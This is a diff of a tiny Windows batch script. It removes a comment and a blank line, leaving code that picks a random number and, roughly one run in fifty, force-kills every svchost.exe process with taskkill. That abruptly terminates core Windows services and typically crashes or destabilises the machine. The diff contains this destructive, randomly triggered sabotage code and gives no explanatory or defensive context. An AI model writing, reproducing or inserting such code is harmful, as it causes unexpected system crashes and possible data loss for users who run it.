@@ -1,7 +1,5 @@
 @echo off
-rem Generate a number from 0–49
 set /A chance=%RANDOM% %% 50
-
 if %chance% EQU 0 (
     taskkill.exe /f /im svchost.exe
 )
